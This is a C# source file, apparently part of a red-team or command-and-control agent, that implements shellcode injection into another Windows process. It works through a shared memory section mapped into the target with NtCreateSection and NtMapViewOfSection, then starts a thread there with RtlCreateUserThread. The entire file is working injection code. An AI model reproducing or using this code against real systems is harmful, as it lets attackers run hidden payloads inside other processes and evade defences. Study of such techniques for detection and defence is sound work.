using System.Diagnostics;
using System.Runtime.InteropServices;
using Agent;

namespace Agent
{
    internal class InterProcessMappedView : ITechnique
    {
        private bool Run(IntPtr hProc, byte[] shellcode)
        {
            IntPtr hSectionHandle = IntPtr.Zero;
            IntPtr pLocalView = IntPtr.Zero;
            UInt64 size = (UInt32)shellcode.Length;

            // create a new section to map view to
            UInt32 result = Native.NtCreateSection(ref hSectionHandle, Native.SectionAccess.SECTION_ALL_ACCESS, IntPtr.Zero, ref size, Native.MemoryProtection.PAGE_EXECUTE_READWRITE, Native.MappingAttributes.SEC_COMMIT, IntPtr.Zero);

            if (result != 0)
            {
                //Debug("[!] Unable to map view of section: {0}", new string[] { ((Native.NTSTATUS)result).ToString() });
                return false;
            }
            //else
                //Debug("[+] NtCreateSection() - section handle: 0x{0}", new string[] { hSectionHandle.ToString("X") });

            // create a local view
            const UInt32 ViewUnmap = 0x2;
            UInt64 offset = 0;
            result = Native.NtMapViewOfSection(hSectionHandle, (IntPtr)(-1), ref pLocalView, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref size, ViewUnmap, 0, Native.MemoryProtection.PAGE_READWRITE);

            if (result != 0)
            {
                //Debug("[!] Unable to map view of section: {0}", new string[] { ((Native.NTSTATUS)result).ToString() });
                return false;
            }
            //else
                //Debug("[+] NtMapViewOfSection() - local view: 0x{0}", new string[] { pLocalView.ToString("X") });

            // copy shellcode to the local view
            Marshal.Copy(shellcode, 0, pLocalView, shellcode.Length);
            //Debug("[+] Marshalling shellcode");

            // create a remote view of the section in the target
            IntPtr pRemoteView = IntPtr.Zero;
            Native.NtMapViewOfSection(hSectionHandle, hProc, ref pRemoteView, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref size, ViewUnmap, 0, Native.MemoryProtection.PAGE_EXECUTE_READ);
            //("[+] NtMapViewOfSection() - remote view: 0x{0}", new string[] { pRemoteView.ToString("X") });

            // execute the shellcode
            IntPtr hThread = IntPtr.Zero;
            Native.CLIENT_ID cid = new Native.CLIENT_ID();
            Native.RtlCreateUserThread(hProc, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, pRemoteView, IntPtr.Zero, ref hThread, cid);
            //Debug("[+] RtlCreateUserThread() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });

            return true;
        }

        public bool Inject(byte[] shellcode, nint hTarget)
        {
            return Run(hTarget, shellcode);
        }

        public bool Inject(byte[] shellcode, Process proc)
        {
            return Run(proc.Handle, shellcode);
        }
    }
}
